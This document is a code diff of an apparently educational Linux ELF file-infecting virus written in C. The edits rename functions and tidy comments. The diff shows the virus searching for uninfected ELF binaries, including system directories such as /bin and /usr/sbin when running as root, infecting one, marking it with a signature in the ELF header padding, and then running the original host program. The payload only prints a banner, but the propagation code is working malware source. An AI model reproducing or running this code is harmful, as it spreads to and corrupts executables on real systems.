@@ -13,39 +13,36 @@
 #include <sys/mman.h>
 #include <elf.h>
 
-#define SIZE 18472
+#define SIZE 18464
 #define MAGIC_NUMBER 0x15D25
 #define TEMP_FILENAME ".tempFileImage"
 
 static inline int get_random_number(int max_num){
 	return rand()%4;
 }
-static inline char * randomly_select_dir(char **dirs) 
+static inline char* randomly_select_dir(char **dirs) 
 {	
 	return (char *)dirs[get_random_number(4)];
 }
 
-/**
- * Execute malacious script
- */
-void executeSomethingBad() {
+/* Execute malacious instructions */
+void devastation() {
 	const unsigned char banner[] = "Virus Text... ";
 	write(1, (char *)banner, sizeof(banner));
 }
 
-/**
- * Returns true if the file's format is ELF
- * (Executeable and Linkable Format)
- * ELF files have the first four bytes as 
- * {0x7f, 'E', 'L', 'F'}.
+/* Returns true if the file's format is ELF (Executeable and Linkable Format)
+ * ELF files have the first four bytes as {0x7f, 'E', 'L', 'F'}
  */
 bool isELF(char* fileName) {
 	if(fileName[0] == '.') return false;
 
-	int hfd = open(fileName, O_RDONLY);
+	int host_fd = open(fileName, O_RDONLY);
+	
 	char header[4];
-	read(hfd, header, 4);
-	close(hfd);
+	read(host_fd, header, 4);
+	
+	close(host_fd);
 
 	return header[0] == 0x7f
 		&& header[1] == 'E'
@@ -55,7 +52,7 @@ bool isELF(char* fileName) {
 
 /**
  * Returns true if the file has not been infected yet
- * by checking the last few bytes of the file 
+ * by checking the padding entry in the EI_PAD of elf header
  */
 bool isClean(char* fileName) {
 	int fd = open(fileName, O_RDONLY);
@@ -67,24 +64,25 @@ bool isClean(char* fileName) {
 }
 
 /**
- * Gets an ELF file's name that is not yet infected in the current working directory. 
+ * Gets an ELF file's name that is not yet infected 
  * If no such files are found, NULL is returned
  */
-char* getCleanHostFile(char *self_name) {
+char* getHealthyHostFile(char *self_name) {
 	struct stat st;
 
-	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" }; //Addresses of the directories to attack if the user of root
+	char *dirs[4] = {"/sbin", "/usr/sbin", "/bin", "/usr/bin" }; 
+	//Addresses of the directories to attack if the user of root
 	char cwd[2] = {'.', '\0'}; 
 	char *selected_dir = getuid() != 0 ? cwd : randomly_select_dir((char **)dirs);
 	DIR *dir = opendir(selected_dir);
 
-	struct dirent *dp;
-	while((dp = readdir(dir)) != NULL){
-		stat(dp->d_name, &st);
-		if(!strcmp(dp->d_name, self_name)) continue;	// Don't infect self
-		if(isELF(dp->d_name) && isClean(dp->d_name)){
+	struct dirent *file;
+	while((file = readdir(dir)) != NULL){
+		stat(file->d_name, &st);
+		if(!strcmp(file->d_name, self_name)) continue;	// Don't infect self
+		if(isELF(file->d_name) && isClean(file->d_name)){
 			closedir(dir);
-			return dp->d_name;
+			return file->d_name;
 		}
 	}
 
@@ -131,7 +129,6 @@ void executeHostPart(int virus_fd, mode_t mode, int totalSize, char *argv[]) {
 	int temp_fd = creat(TEMP_FILENAME, mode);
 
 	lseek(virus_fd, SIZE, SEEK_SET);
-	// int hostSize = totalSize - SIZE - signatureSize;
 	int hostSize = totalSize - SIZE;
 	sendfile(temp_fd, virus_fd, NULL, hostSize);
 	close(temp_fd);
@@ -146,8 +143,9 @@ void executeHostPart(int virus_fd, mode_t mode, int totalSize, char *argv[]) {
 	}
 }
 
-
-
+/**
+ * Adds a flag/signature to the EI_PAD region of the ELF header
+ */
 void addSignatureToELFPadding(int fd, char *fileName){
     lseek(fd, 0, SEEK_SET);
 	struct stat st;
@@ -162,7 +160,10 @@ void addSignatureToELFPadding(int fd, char *fileName){
 	rename(TEMP_FILENAME, fileName);
 }
 
-
+/**
+ * It makes a copy of the current file and adds the flag and then
+ * renames itself to the original file
+ */
 void makeCopyAndAddSignature(char *fileName){
 	char buf[200];
 	strcpy(buf,fileName);
@@ -188,9 +189,9 @@ void main(int argc, char *argv[]) {
 	int virus_fd = open(argv[0], O_RDWR);
     struct stat st;
 	fstat(virus_fd, &st);
-	executeSomethingBad();
+	devastation();
 	
-	char* cleanHostName = getCleanHostFile((char*)argv[0] + 2);
+	char* cleanHostName = getHealthyHostFile((char*)argv[0] + 2);
 	if(cleanHostName != NULL) 
 		infectHostFile(cleanHostName, virus_fd);
 		 
